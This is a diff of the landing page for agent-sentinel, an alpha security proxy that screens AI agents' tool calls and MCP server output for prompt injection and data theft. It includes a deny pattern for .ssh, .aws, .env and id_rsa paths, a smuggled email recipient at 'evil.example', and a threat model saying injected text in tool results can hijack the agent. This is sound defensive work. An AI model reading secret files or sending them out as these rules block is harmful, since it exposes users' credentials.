@@ -956,22 +1027,26 @@ agent-sentinel report audit.jsonl</code></pre>
     { <span class="t-k">"arg"</span>: <span class="t-s">"*"</span>, <span class="t-k">"pattern"</span>: <span class="t-s">"(^|[\\\\/:])\\.(ssh|aws|env)\\b|id_rsa"</span> }
   ],
   <span class="t-k">"tools"</span>: {
-<span class="ln" data-n="3">    <span class="t-k">"read_file"</span>: <span class="t-s">"allow"</span>,</span>
+<span class="ln" data-n="3">    <span class="t-k">"read_file"</span>: { <span class="t-k">"action"</span>: <span class="t-s">"allow"</span>, <span class="t-k">"labels"</span>: [<span class="t-s">"private"</span>] },</span>
+    <span class="t-k">"fetch_page"</span>: { <span class="t-k">"action"</span>: <span class="t-s">"allow"</span>, <span class="t-k">"labels"</span>: [<span class="t-s">"untrusted"</span>] },
 <span class="ln" data-n="4">    <span class="t-k">"search_*"</span>: <span class="t-s">"allow"</span>,</span>
 <span class="ln" data-n="5">    <span class="t-k">"send_email"</span>: {</span>
       <span class="t-k">"action"</span>: <span class="t-s">"ask"</span>,
+      <span class="t-k">"labels"</span>: [<span class="t-s">"sink"</span>],
       <span class="t-k">"allow_args"</span>: [
-        { <span class="t-k">"arg"</span>: <span class="t-s">"to"</span>, <span class="t-k">"pattern"</span>: <span class="t-s">"[^@\\s,;]+@example\\.com"</span> },
-        { <span class="t-k">"arg"</span>: <span class="t-s">"cc"</span>, <span class="t-k">"pattern"</span>: <span class="t-s">"[^@\\s,;]+@example\\.com"</span>, <span class="t-k">"optional"</span>: true },
+        { <span class="t-k">"arg"</span>: <span class="t-s">"to"</span>, <span class="t-k">"type"</span>: <span class="t-s">"email"</span>, <span class="t-k">"domains"</span>: [<span class="t-s">"example.com"</span>] },
         { <span class="t-k">"arg"</span>: <span class="t-s">"body"</span>, <span class="t-k">"pattern"</span>: <span class="t-s">"(?s).*"</span>, <span class="t-k">"optional"</span>: true }
       ],
       <span class="t-k">"other_args"</span>: <span class="t-s">"block"</span>
     },
 <span class="ln" data-n="6">    <span class="t-k">"delete_*"</span>: <span class="t-s">"block"</span></span>
-  }
+  },
+<span class="ln" data-n="7">  <span class="t-k">"flows"</span>: [</span>
+    { <span class="t-k">"after"</span>: [<span class="t-s">"untrusted"</span>, <span class="t-s">"private"</span>], <span class="t-k">"then"</span>: <span class="t-s">"sink"</span>, <span class="t-k">"action"</span>: <span class="t-s">"block"</span> }
+  ]
 }</code></pre>
             </div>
-            <p class="note">Check a policy before you use it with <code>agent-sentinel validate policy.json</code>. Loading is strict: a typo or a duplicate key is an error.</p>
+            <p class="note">Check a policy before you use it with <code>agent-sentinel validate policy.json</code>, and try calls on it with <code>agent-sentinel check</code>. Loading is strict: a typo or a duplicate key is an error.</p>
             </div>
             <ol class="callouts" aria-label="What each numbered line means">
               <li class="callout">
@@ -991,8 +1066,8 @@ agent-sentinel report audit.jsonl</code></pre>
               <li class="callout">
                 <span class="callout__num" aria-hidden="true">3</span>
                 <div>
-                  <p class="callout__key"><code>"read_file": "allow"</code></p>
-                  <p>The tool runs, unless a deny rule matches the call.</p>
+                  <p class="callout__key"><code>"read_file"</code></p>
+                  <p>The tool runs, unless a deny rule matches the call. Its label, <code>private</code>, tells the flow rule what kind of content it returns.</p>
                 </div>
               </li>
               <li class="callout">
@@ -1006,7 +1081,7 @@ agent-sentinel report audit.jsonl</code></pre>
                 <span class="callout__num" aria-hidden="true">5</span>
                 <div>
                   <p class="callout__key"><code>"send_email"</code></p>
-                  <p>A human must approve each call. The <code>to</code> value must match the allow pattern as a whole, so <code>boss@example.com</code> passes and <code>attacker@evil.example, boss@example.com</code> does not.</p>
+                  <p>A human must approve each call. <code>to</code> must be one plain address at <code>example.com</code>, so <code>boss@example.com</code> passes and <code>attacker@evil.example, boss@example.com</code> does not.</p>
                 </div>
               </li>
               <li class="callout">
@@ -1014,6 +1089,13 @@ agent-sentinel report audit.jsonl</code></pre>
                 <div>
                   <p class="callout__key"><code>"delete_*": "block"</code></p>
                   <p>Always refused.</p>
+                </div>
+              </li>
+              <li class="callout">
+                <span class="callout__num" aria-hidden="true">7</span>
+                <div>
+                  <p class="callout__key"><code>"flows"</code></p>
+                  <p>Once the agent has read a web page (<code>untrusted</code>) and a private file, every tool labeled <code>sink</code> is refused for the rest of the session.</p>
                 </div>
               </li>
             </ol>
@@ -1037,12 +1119,13 @@ agent-sentinel report audit.jsonl</code></pre>
           <h3>Guarantees</h3>
           <p class="security__intro">When the proxy is in front of an MCP server:</p>
           <ol class="guarantees">
-            <li>A <code>tools/call</code>, <code>resources/read</code> or <code>resources/subscribe</code> request reaches the server only if the policy allows it.</li>
-            <li>Every message from the server is scanned before any of it reaches the client, and a reply is rebuilt from the parts that were scanned.</li>
+            <li>A <code>tools/call</code>, <code>resources/read</code> or <code>resources/subscribe</code> request reaches the server only if the policy allows it, and an "ask" only after a person approved it.</li>
+            <li>Every message from the server is scanned before any of it reaches the client, including requests a server puts inside its replies, and a reply is rebuilt from the parts that were checked.</li>
             <li>A message the proxy cannot parse, match to a request, or check is not forwarded.</li>
             <li>The server receives exactly the message that was checked, not the original bytes.</li>
             <li>Hostile text cannot stall the scanner, and text the proxy prints or writes to the audit log has its control codes escaped.</li>
-            <li>A tool whose description is flagged, or whose definition changes after it was first listed, is removed from the tool list and cannot be called.</li>
+            <li>A tool, prompt or template whose description is flagged, or whose definition changes after it was first listed, is removed and cannot be used.</li>
+            <li>What the agent is told about a refusal never names a rule or a pattern.</li>
           </ol>
           <p class="security__after">A bypass counts as a vulnerability when it breaks one of these guarantees. A new phrasing that the pattern rules miss is expected, and is welcome as an ordinary issue or pull request.</p>
         </div>
@@ -1052,12 +1135,13 @@ agent-sentinel report audit.jsonl</code></pre>
             <p class="limits__sticker">Read this first</p>
             <h3>What it does not do</h3>
             <ul class="limits__list">
-              <li>The injection detector is pattern rules, not a trained model. It misses reworded, translated or base64-encoded attacks, and it can flag harmless text.</li>
+              <li>The injection detector is pattern rules in English, not a trained model. It misses reworded or translated attacks, and it can flag harmless text.</li>
               <li><span class="hl hl--mint">The permission policy is the dependable part.</span> Treat the detector as an extra layer, not as proof that content is safe.</li>
-              <li>Human approval is not yet available in proxy mode.</li>
-              <li>Only the stdio transport is supported, not HTTP.</li>
-              <li>It has not yet been tested against a wide range of third-party MCP servers.</li>
-              <li>It has had no independent audit.</li>
+              <li>Paths and URLs are judged as text: symbolic links are not followed and host names are not looked up.</li>
+              <li>In the proxy, flow rules see one server at a time. To cover a chain across servers, use the library or the Claude Code hooks.</li>
+              <li>An approval is only as safe as the way the question reaches a person.</li>
+              <li>Only the stdio transport is supported, not HTTP. Hooks cover Claude Code only.</li>
+              <li>It has not yet been tested against a wide range of third-party MCP servers, and it has had no independent audit.</li>
             </ul>
             <p class="limits__more">The <a href="https://github.com/FarooqAzamdogar/agent-sentinel/blob/main/SECURITY.md" rel="noopener">security policy</a> lists every known limit.</p>
           </div>
@@ -1078,22 +1162,32 @@ agent-sentinel report audit.jsonl</code></pre>
             <tr role="row">
               <th scope="row" role="rowheader">The person who writes the policy and starts the proxy</th>
               <td role="cell"><span class="status status--ok">Yes</span></td>
-              <td role="cell">They choose the server command and the rules.</td>
+              <td role="cell">They choose the server command, the rules and who approves.</td>
             </tr>
             <tr role="row">
               <th scope="row" role="rowheader">The MCP server and everything it returns</th>
               <td role="cell"><span class="status status--bad">No</span></td>
-              <td role="cell">Tool results, tool descriptions and server instructions can all carry injected text.</td>
+              <td role="cell">Tool results, descriptions, annotations, icons and server instructions can all carry injected text.</td>
             </tr>
             <tr role="row">
               <th scope="row" role="rowheader">The agent (the model)</th>
               <td role="cell"><span class="status status--ask">Partly</span></td>
-              <td role="cell">It may have been hijacked by text it read earlier, so the actions it requests must pass the policy.</td>
+              <td role="cell">It may have been hijacked by text it read earlier, so the actions it requests must pass the policy. It can never approve its own call.</td>
             </tr>
             <tr role="row">
               <th scope="row" role="rowheader">The client application's own protocol messages</th>
               <td role="cell"><span class="status status--ok">Yes</span></td>
-              <td role="cell">The proxy assumes the client software itself is not malicious.</td>
+              <td role="cell">The proxy assumes the client software itself is not malicious. Its answers to the server still pass the secret guard.</td>
+            </tr>
+            <tr role="row">
+              <th scope="row" role="rowheader">The person who answers an approval</th>
+              <td role="cell"><span class="status status--ok">Yes</span></td>
+              <td role="cell">They decide. A client that answers forms by itself decides in their place, so use the dialog where a client does not show forms to a person.</td>
+            </tr>
+            <tr role="row">
+              <th scope="row" role="rowheader">The policy, pins and audit log files</th>
+              <td role="cell"><span class="status status--ask">As files</span></td>
+              <td role="cell">Anything that can write them can change what agent-sentinel does. Keep them out of every folder the agent's tools can write to.</td>
             </tr>
           </tbody>
         </table>
@@ -1121,28 +1215,42 @@ agent-sentinel report audit.jsonl</code></pre>
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-code"/></svg></span>
             <h3 class="card__title">Your own agent</h3>
           </div>
-          <p>Wrap the tools your agent calls with <code>firewall.run</code>. Each call is checked before it runs, and each result is scanned before the model reads it.</p>
+          <p>Decorate the tools your agent calls with <code>guard</code>, or run them through <code>firewall.run</code>. Each call is checked before it runs, and each result is scanned before the model reads it.</p>
         </article>
         <article class="card feature">
           <div class="feature__head">
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-server"/></svg></span>
             <h3 class="card__title">Third-party MCP servers</h3>
           </div>
-          <p>Put the proxy in front of a server you did not write. Its tool descriptions, results and instructions are scanned, and poisoned or changed tools are quarantined.</p>
+          <p>Put the proxy in front of servers you did not write, in Claude Desktop, Cursor, VS Code or Windsurf. Their tool descriptions, results and instructions are scanned, and poisoned or changed tools are quarantined.</p>
         </article>
         <article class="card feature">
           <div class="feature__head">
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-policy"/></svg></span>
             <h3 class="card__title">Data rules</h3>
           </div>
-          <p>Write rules such as <q>email only to our domain</q> with allow patterns on the recipient arguments and <code>"other_args": "block"</code>, so no other recipient field is accepted. Keep an agent away from <code>.ssh</code> and <code>.env</code> paths with a policy-wide deny rule.</p>
+          <p>Write rules such as <q>email only to our domain</q> or <q>files only inside this project</q> with typed argument rules and <code>"other_args": "block"</code>. Keep an agent away from <code>.ssh</code> and <code>.env</code> paths with a policy-wide deny rule.</p>
         </article>
         <article class="card feature">
           <div class="feature__head">
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-log"/></svg></span>
             <h3 class="card__title">Audit and compliance review</h3>
           </div>
-          <p>Keep a JSON-lines record of every decision for a later review. Run in monitor mode first to see what a policy would block before you enforce it.</p>
+          <p>Keep a JSON-lines record of every decision for a later review. Run in monitor mode first to see what a policy would block before you enforce it, then let <code>suggest</code> draft the rules.</p>
+        </article>
+        <article class="card feature">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-terminal"/></svg></span>
+            <h3 class="card__title">Claude Code</h3>
+          </div>
+          <p>Install the hooks, and every Read, Edit, Bash, web and MCP call is checked against your policy before it runs, with flow rules across all of them.</p>
+        </article>
+        <article class="card feature">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-check"/></svg></span>
+            <h3 class="card__title">Policies tested in CI</h3>
+          </div>
+          <p>Write the calls a policy must allow and refuse in a case file, and run <code>agent-sentinel test</code> in CI. A change that weakens a rule fails the build.</p>
         </article>
       </div>
     </div>
@@ -1167,11 +1275,11 @@ agent-sentinel report audit.jsonl</code></pre>
             </li>
             <li>
               <strong>Add a detector rule.</strong>
-              <span>Include a test that shows harmless text does not trigger it.</span>
+              <span>Include a test that shows harmless text does not trigger it. 650 real tool descriptions must stay below high.</span>
             </li>
             <li>
-              <strong>Human approval for the proxy.</strong>
-              <span>Rules set to ask a human need a way to reach one in proxy mode.</span>
+              <strong>Hooks for more clients.</strong>
+              <span>Codex, Cursor and VS Code have hook systems of their own.</span>
             </li>
             <li>
               <strong>HTTP transport.</strong>
@@ -1186,7 +1294,7 @@ agent-sentinel report audit.jsonl</code></pre>
 
         <div class="contribute__side">
           <h3>Start here</h3>
-          <p>CONTRIBUTING.md explains how the code is organized, how a message flows through it, and the security rules every change must keep.</p>
+          <p>CONTRIBUTING.md explains how the code is organized, how a message flows through it, how to add a rule, a matcher or a command, and the security rules every change must keep.</p>
           <div class="code">
             <div class="code__bar">
               <span class="code__label">Run the tests</span>
@@ -1246,7 +1354,7 @@ agent-sentinel report audit.jsonl</code></pre>
             <h3 class="faq__q">Will it slow my agent down?</h3>
             <svg class="icon faq__icon" aria-hidden="true" focusable="false" width="18" height="18"><use href="#i-chevron"/></svg>
           </summary>
-          <p class="faq__a">Scanning is linear-time pattern matching that runs on your own machine, and it makes no network calls. No benchmark numbers are published yet.</p>
+          <p class="faq__a">Scanning is linear-time pattern matching that runs on your own machine, and it makes no network calls. In Claude Code, each hook run starts a new Python process, which adds about a tenth to a third of a second to a tool call. No benchmark numbers are published yet.</p>
         </details>
         <details class="faq__item">
           <summary class="faq__summary">
@@ -1260,21 +1368,21 @@ agent-sentinel report audit.jsonl</code></pre>
             <h3 class="faq__q">Is it production ready?</h3>
             <svg class="icon faq__icon" aria-hidden="true" focusable="false" width="18" height="18"><use href="#i-chevron"/></svg>
           </summary>
-          <p class="faq__a">Not yet. Version 0.4.1 is an alpha release. It has not been tested against a wide range of third-party MCP servers and has had no independent audit. Start in monitor mode, read the limits, and treat it as one layer of defense.</p>
+          <p class="faq__a">Not yet. Version 0.5.0 is an alpha release. It has not been tested against a wide range of third-party MCP servers and has had no independent audit. Start in monitor mode, read the limits, and treat it as one layer of defense.</p>
         </details>
         <details class="faq__item">
           <summary class="faq__summary">
             <h3 class="faq__q">How is it different from a prompt-injection classifier?</h3>
             <svg class="icon faq__icon" aria-hidden="true" focusable="false" width="18" height="18"><use href="#i-chevron"/></svg>
           </summary>
-          <p class="faq__a">A classifier tries to detect an attack in text. agent-sentinel also enforces permissions on every tool call, and those permissions do not depend on detecting the attack. If an injection gets past the scanner, the policy still decides what the agent is allowed to do.</p>
+          <p class="faq__a">A classifier tries to detect an attack in text. agent-sentinel also enforces permissions on every tool call, and those permissions do not depend on detecting the attack. If an injection gets past the scanner, the policy and its flow rules still decide what the agent is allowed to do.</p>
         </details>
         <details class="faq__item">
           <summary class="faq__summary">
-            <h3 class="faq__q">Which MCP servers does it work with?</h3>
+            <h3 class="faq__q">Which clients and servers does it work with?</h3>
             <svg class="icon faq__icon" aria-hidden="true" focusable="false" width="18" height="18"><use href="#i-chevron"/></svg>
           </summary>
-          <p class="faq__a">Any MCP server that uses the stdio transport can be placed behind the proxy. HTTP is not supported yet. It has not been tested against a wide range of third-party servers, so reports of what works and what breaks are welcome.</p>
+          <p class="faq__a">The proxy works in front of any MCP server that uses the stdio transport, and the wrap command sets it up for Claude Desktop, Claude Code, Cursor, VS Code and Windsurf. Claude Code can also run it as hooks. HTTP servers are not supported yet. It has not been tested against a wide range of third-party servers, so reports of what works and what breaks are welcome.</p>
         </details>
       </div>
     </div>
@@ -1291,13 +1399,14 @@ agent-sentinel report audit.jsonl</code></pre>
         <div class="cta__action">
           <div class="code">
             <div class="code__bar">
-              <span class="code__label">Install from GitHub</span>
+              <span class="code__label">Install from GitHub, then run the demo</span>
               <button type="button" class="copy" data-copy>
                 <svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-copy"/></svg>
-                <span data-copy-label>Copy</span><span class="visually-hidden"> install command</span>
+                <span data-copy-label>Copy</span><span class="visually-hidden"> install and demo commands</span>
               </button>
             </div>
-            <pre tabindex="0"><code>pip install git+https://github.com/FarooqAzamdogar/agent-sentinel.git</code></pre>
+            <pre tabindex="0"><code>pip install git+https://github.com/FarooqAzamdogar/agent-sentinel.git
+agent-sentinel demo</code></pre>
           </div>
           <div class="btn-row">
             <a class="btn btn--primary" href="#quick-start">Get started
@@ -1322,7 +1431,7 @@ agent-sentinel report audit.jsonl</code></pre>
         <span class="brand__mark"><svg class="icon" aria-hidden="true" focusable="false" width="24" height="24"><use href="#i-shield"/></svg></span>
         <span class="brand__name">agent-sentinel</span>
       </a>
-      <p>A security layer between an AI agent and the tools it uses. Version 0.4.1, alpha.</p>
+      <p>A security layer between an AI agent and the tools it uses. Version 0.5.0, alpha.</p>
       <p>Released under the MIT license. Built in the open.</p>
     </div>
     <nav class="site-footer__nav" aria-label="Project links">
@@ -1331,6 +1440,7 @@ agent-sentinel report audit.jsonl</code></pre>
         <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel#readme" rel="noopener">README</a></li>
         <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel/blob/main/SECURITY.md" rel="noopener">Security policy</a></li>
         <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel/blob/main/CONTRIBUTING.md" rel="noopener">Contributing</a></li>
+        <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel/blob/main/CHANGELOG.md" rel="noopener">Changelog</a></li>
         <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel/issues" rel="noopener">Issues</a></li>
         <li><a href="https://github.com/FarooqAzamdogar/agent-sentinel/blob/main/LICENSE" rel="noopener">License</a></li>
       </ul>
